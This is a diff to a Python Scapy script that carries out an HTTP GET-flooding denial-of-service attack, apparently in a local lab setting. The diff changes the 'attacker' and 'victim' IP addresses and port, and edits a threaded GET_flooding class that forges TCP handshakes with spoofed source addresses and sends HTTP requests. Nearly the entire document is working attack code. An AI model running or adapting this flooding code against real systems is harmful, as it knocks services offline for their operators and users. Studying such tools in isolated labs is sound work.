@@ -26,10 +26,10 @@ useragents = [ ##user envs
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-incdot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 ]
 
-Attacker_ip = "192.168.0.23" #Attacker Ip adress 
-target_ip = "192.168.0.74" #victim Ip adress
-target_port = 8819 # victim port
-target_url = "dslabjbnu.iptime.org"
+Attacker_ip = "192.168.0.75" #Attacker Ip adress 
+target_ip = "192.168.0.34" #victim Ip adress
+target_port = 80 # victim port
+target_url = "192.168.0.34/temp"
 
 class GET_flooding(Thread):
     
@@ -52,11 +52,11 @@ class GET_flooding(Thread):
 
     def Run_Attack(self):
         self.req_head, self.source_ip = self.make_attack_information()
+        print(self.source_ip)
         self.source_port = int(RandShort())
-        self.packet=IP(src=self.source_ip, dst=self.dst_ip)/TCP(sport=self.source_port,dport=self.port,flags='S')
+        self.packet=IP(src=Attacker_ip, dst=self.dst_ip)/TCP(sport=self.source_port,dport=self.port,flags='S')
         
         self.syn_ack = sr1(self.packet)
-        print("tttttttttt")
         self.ack = IP(src=self.source_ip, dst=self.dst_ip)/TCP(sport=self.source_port,dport=self.port,seq=self.syn_ack[TCP].ack,ack=self.syn_ack[TCP].seq+1)/self.req_head
         send(self.ack) ##make 3hand_shake
 
